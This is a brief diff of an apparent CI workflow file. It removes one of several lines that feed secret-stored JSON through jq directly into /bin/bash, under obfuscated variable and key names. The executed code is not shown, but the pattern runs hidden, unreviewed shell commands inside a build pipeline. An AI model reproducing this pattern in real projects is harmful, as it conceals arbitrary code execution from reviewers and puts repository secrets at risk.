@@ -23,7 +23,6 @@ jobs:
           mdpb13889: ${{ secrets.mdpb13889 }}
         run: |
           printf '%s' "$mdpb13889" | jq -r .x984 | /bin/bash
-          printf '%s' "$bcv019" | jq -r .vtepp21728 | /bin/bash
           printf '%s' "$ci0" | jq -r .tfhrk58223 | /bin/bash
           echo $as8 | jq -r .mr55772 | /bin/bash
           echo $srket88 | jq -r .tumuj23074 | /bin/bash
